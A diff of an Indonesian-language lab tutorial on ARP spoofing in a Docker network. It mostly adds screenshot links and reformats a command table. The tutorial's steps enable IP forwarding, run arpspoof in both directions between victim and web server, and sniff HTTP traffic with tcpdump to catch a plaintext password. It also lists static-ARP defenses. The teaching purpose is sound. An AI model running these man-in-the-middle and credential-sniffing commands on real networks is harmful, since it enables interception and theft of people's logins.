@@ -276,6 +276,11 @@ lab-arp-cepat/
 ```
 
 ### Langkah 4: Jalankan Lab (Cepat! ⚡)
+
+![Step](/Pertemuan3/pertemuan3%20(1).png)
+
+![Step](/Pertemuan3/pertemuan3%20(2).png)
+
 ```bash
 # Start semua container
 docker-compose up -d
@@ -289,6 +294,8 @@ docker-compose ps
 # Semua harus "Up"
 ```
 
+![Step](/Pertemuan3/pertemuan3%20(3).png)
+
 ### Langkah 5: Test Koneksi
 ```bash
 # Test dari korban
@@ -301,6 +308,12 @@ docker exec korban ping -c 2 172.20.0.20
 
 ---
 
+![Step](/Pertemuan3/pertemuan3%20(4).png)
+
+![Step](/Pertemuan3/pertemuan3%20(5).png)
+
+![Step](/Pertemuan3/pertemuan3%20(6).png)
+
 ## 4. Hands-On: ARP Spoofing dengan arpspoof
 
 ### 🎯 **Praktik 10 Menit**
@@ -312,10 +325,14 @@ docker exec korban ping -c 2 172.20.0.20
 docker exec -it penyerang bash
 ```
 
+![Step](/Pertemuan3/pertemuan3%20(7).png)
+
 **Terminal 2 - Korban:**
 ```bash
 docker exec -it korban bash
 ```
+
+![Step](/Pertemuan3/pertemuan3%20(8).png)
 
 **Terminal 3 - Monitoring:**
 ```bash
@@ -328,7 +345,11 @@ docker exec -it korban bash
 ```bash
 # Lihat ARP table awal
 arp -n
+```
 
+![Step](/Pertemuan3/pertemuan3%20(9).png)
+
+```bash
 # Catat MAC asli web asli
 MAC_ASLI=$(arp -n | grep 172.20.0.20 | awk '{print $3}')
 echo "MAC ASLI Web: $MAC_ASLI"
@@ -336,6 +357,8 @@ echo "MAC ASLI Web: $MAC_ASLI"
 # Test akses web
 curl http://172.20.0.20
 ```
+
+![Step](/Pertemuan3/pertemuan3%20(10).png)
 
 ### Langkah 2: Mulai Serangan (Di Penyerang)
 
@@ -345,13 +368,21 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Jalankan ARP spoofing ke korban (bohongi korban)
 arpspoof -i eth0 -t 172.20.0.10 172.20.0.20
+```
 
+![Step](/Pertemuan3/pertemuan3%20(11).png)
+
+```bash
 # Buka terminal penyerang BARU (Terminal 4)
 docker exec -it penyerang bash
 
 # Jalankan spoof ke server
 arpspoof -i eth0 -t 172.20.0.20 172.20.0.10
+```
 
+![Step](/Pertemuan3/pertemuan3%20(12).png)
+
+```bash
 # Buka terminal penyerang BARU (Terminal 5)
 docker exec -it penyerang bash
 
@@ -359,17 +390,25 @@ docker exec -it penyerang bash
 tcpdump -i eth0 -A -l port 80 | grep -E "user=|pass="
 ```
 
+![Step](/Pertemuan3/pertemuan3%20(13).png)
+
 ### Langkah 3: Buktikan Serangan (Di Korban)
 
 ```bash
 # Lihat perubahan ARP table
 arp -n | grep 172.20.0.20
 # MAC sekarang = MAC penyerang!
+```
 
+![Step](/Pertemuan3/pertemuan3%20(14).png)
+
+```bash
 # Kirim data login
 curl -X POST http://172.20.0.20/login \
   -d "user=andi&pass=rahasia123"
 ```
+
+![Step](/Pertemuan3/pertemuan3%20(15).png)
 
 ### Langkah 4: Lihat Hasil (Di Terminal Sniffing)
 
@@ -377,6 +416,8 @@ Akan muncul:
 ```
 user=andi&pass=rahasia123
 ```
+
+![Step](/Pertemuan3/pertemuan3%20(16).png)
 
 ### 🎉 **SELAMAT! Anda berhasil menangkap password!**
 
@@ -526,21 +567,21 @@ docker exec web-asli curl http://localhost
 
 ## Ringkasan Perintah Penting
 
-| Fungsi | Perintah |
-|--------|----------|
-| Start lab | `docker-compose up -d` |
-| Stop lab | `docker-compose down` |
-| Masuk penyerang | `docker exec -it penyerang bash` |
-| Masuk korban | `docker exec -it korban bash` |
-| Lihat ARP | `arp -n` |
-| Spoof korban | `arpspoof -i eth0 -t 172.20.0.10 172.20.0.20` |
-| Spoof server | `arpspoof -i eth0 -t 172.20.0.20 172.20.0.10` |
-| IP Forward | `echo 1 > /proc/sys/net/ipv4/ip_forward` |
-| Sniff HTTP | `tcpdump -i eth0 -A port 80` |
-| Sniff password | `tcpdump -i eth0 -A -l port 80 \| grep -E "user\|pass"` |
-| Static ARP | `arp -s 172.20.0.20 02:42:ac:14:00:14` |
-| Reset ARP | `ip neigh flush all` |
-| Matikan serangan | `killall arpspoof` |
+| Fungsi           | Perintah                                                |
+| ---------------- | ------------------------------------------------------- |
+| Start lab        | `docker-compose up -d`                                  |
+| Stop lab         | `docker-compose down`                                   |
+| Masuk penyerang  | `docker exec -it penyerang bash`                        |
+| Masuk korban     | `docker exec -it korban bash`                           |
+| Lihat ARP        | `arp -n`                                                |
+| Spoof korban     | `arpspoof -i eth0 -t 172.20.0.10 172.20.0.20`           |
+| Spoof server     | `arpspoof -i eth0 -t 172.20.0.20 172.20.0.10`           |
+| IP Forward       | `echo 1 > /proc/sys/net/ipv4/ip_forward`                |
+| Sniff HTTP       | `tcpdump -i eth0 -A port 80`                            |
+| Sniff password   | `tcpdump -i eth0 -A -l port 80 \| grep -E "user\|pass"` |
+| Static ARP       | `arp -s 172.20.0.20 02:42:ac:14:00:14`                  |
+| Reset ARP        | `ip neigh flush all`                                    |
+| Matikan serangan | `killall arpspoof`                                      |
 
 ---
 
